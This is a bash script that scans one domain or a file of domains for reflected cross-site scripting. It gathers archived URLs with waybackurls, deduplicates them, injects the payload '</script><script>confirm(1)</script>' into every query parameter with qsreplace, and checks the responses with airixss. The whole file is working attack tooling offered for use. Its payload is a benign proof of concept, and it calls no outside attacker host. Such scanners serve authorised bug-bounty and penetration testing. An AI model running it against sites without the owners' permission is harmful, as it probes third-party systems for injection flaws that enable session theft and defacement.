#!/bin/bash

# Function to display help information
show_help() {
    echo "Usage: bash $0 <domain_or_domain_list_file>"
    echo
    echo "Scan domains for XSS vulnerabilities using the Wayback Machine, urldedupe, qsreplace, and airixss."
    echo
    echo "Options:"
    echo "  <domain_or_domain_list_file>  A domain (e.g., domain.com) or a file containing a list of domains (one per line)."
    echo "  --help                        Show this help message and exit."
    echo
    echo "Example usage:"
    echo "  $0 domain.com                 # Scan a single domain"
    echo "  $0 domains.txt                # Scan multiple domains from a file"
}

# Function to scan a single domain
scan_domain() {
    DOMAIN=$1

    echo "Scanning domain: $DOMAIN"

    # Step 1: Get historical URLs from the Wayback Machine
    waybackurls $DOMAIN | 

    # Step 2: Remove duplicate URLs and sort them
    urldedupe -qs | 

    # Step 3: Replace parts of URLs with XSS payload
    qsreplace "</script><script>confirm(1)</script>" | 

    # Step 4: Test for XSS vulnerabilities
    airixss -payload "confirm(1)" | 

    # Step 5: Filter out false positives (e.g., lines containing 'Not')
    egrep -v 'Not'
}

# Check if the --help flag is passed
if [[ "$1" == "--help" ]]; then
    show_help
    exit 0
fi

# Check if a domain or file is provided
if [ -z "$1" ]; then
    echo "Error: No domain or file provided."
    show_help
    exit 1
fi

# Check if input is a file or single domain
if [ -f "$1" ]; then
    # Input is a file, scan each domain
    while IFS= read -r DOMAIN; do
        scan_domain $DOMAIN
    done < "$1"
else
    # Input is a single domain, scan it
    scan_domain $1
fi
